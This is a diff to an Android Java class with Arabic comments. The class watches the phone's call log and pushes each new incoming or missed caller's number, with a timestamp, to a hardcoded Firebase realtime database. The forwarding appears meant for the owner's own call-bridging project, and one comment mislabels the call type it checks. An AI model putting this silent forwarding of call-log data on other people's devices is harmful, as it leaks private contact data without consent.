@@ -7,10 +7,17 @@ import android.net.Uri;
 import android.os.Handler;
 import android.provider.CallLog;
 import android.util.Log;
+import com.google.firebase.database.DatabaseReference;
+import com.google.firebase.database.FirebaseDatabase;
+import java.util.HashMap;
+import java.util.Map;
 
 public class CallLogObserver extends ContentObserver {
+
     private Context context;
-    private String lastNumber = "";
+    private static final String TAG = "CallLogObserver";
+    private static final String DB_URL = "https://banproject-2f9c6-default-rtdb.firebaseio.com/";
+    private String lastHandledNumber = "";
 
     public CallLogObserver(Handler handler, Context context) {
         super(handler);
@@ -20,12 +27,13 @@ public class CallLogObserver extends ContentObserver {
     @Override
     public void onChange(boolean selfChange, Uri uri) {
         super.onChange(selfChange, uri);
-        // التحقق من آخر مكالمة مضافة في السجل
-        checkLastCall();
+        // يتم استدعاء هذه الدالة فور حدوث أي تغيير في سجل المكالمات
+        checkLastCallEntry();
     }
 
-    private void checkLastCall() {
+    private void checkLastCallEntry() {
         try {
+            // الاستعلام عن آخر مكالمة مضافة للسجل (ترتيب تنازلي حسب التاريخ)
             Cursor cursor = context.getContentResolver().query(
                     CallLog.Calls.CONTENT_URI,
                     null, null, null,
@@ -36,23 +44,42 @@ public class CallLogObserver extends ContentObserver {
                 int numberIndex = cursor.getColumnIndex(CallLog.Calls.NUMBER);
                 int typeIndex = cursor.getColumnIndex(CallLog.Calls.TYPE);
                 
-                String number = cursor.getString(numberIndex);
-                int type = cursor.getInt(typeIndex);
+                String incomingNumber = cursor.getString(numberIndex);
+                int callType = cursor.getInt(typeIndex);
 
-                // نتأكد أنها مكالمة واردة (INCOMING) أو فائتة (MISSED) ولم نرسلها للتو
-                if ((type == CallLog.Calls.INCOMING_TYPE || type == CallLog.Calls.MISSED_TYPE) 
-                    && !number.equals(lastNumber)) {
+                // التأكد أنها مكالمة صادرة أو فائتة (أندرويد يسجلها هكذا فور الرنين)
+                // والتأكد من عدم تكرار إرسال نفس الرقم في نفس اللحظة
+                if ((callType == CallLog.Calls.INCOMING_TYPE || callType == CallLog.Calls.MISSED_TYPE) 
+                    && !incomingNumber.equals(lastHandledNumber)) {
                     
-                    lastNumber = number;
-                    Log.d("CallLogObserver", "تم التقاط رقم من السجل: " + number);
+                    lastHandledNumber = incomingNumber;
+                    Log.d(TAG, "تم اكتشاف رقم جديد في السجل: " + incomingNumber);
                     
-                    // إرسال الرقم فوراً إلى رابط Firebase RTDB الخاص بك
-                    CloudSender.sendSignal(number, "CALL");
+                    // إرسال البيانات فوراً إلى Firebase
+                    sendToFirebase(incomingNumber);
                 }
                 cursor.close();
             }
         } catch (SecurityException e) {
-            Log.e("CallLogObserver", "خطأ: إذن سجل المكالمات غير ممنوح.");
+            Log.e(TAG, "خطأ: إذن سجل المكالمات غير ممنوح للتطبيق.");
+        } catch (Exception e) {
+            Log.e(TAG, "خطأ أثناء قراءة سجل المكالمات: " + e.getMessage());
         }
+    }
+
+    private void sendToFirebase(String number) {
+        FirebaseDatabase database = FirebaseDatabase.getInstance(DB_URL);
+        DatabaseReference myRef = database.getReference("bridge_signals");
+
+        Map<String, Object> data = new HashMap<>();
+        data.put("number", number);
+        data.put("type", "CALL");
+        data.put("method", "CallLogObserver"); // لتمييز مصدر البيانات
+        data.put("timestamp", System.currentTimeMillis());
+
+        // استخدام setValue يجعل التحديث لحظياً ويصل للمستقبل في أجزاء من الثانية
+        myRef.setValue(data).addOnFailureListener(e -> 
+            Log.e(TAG, "فشل الإرسال لـ Firebase: " + e.getMessage())
+        );
     }
 }
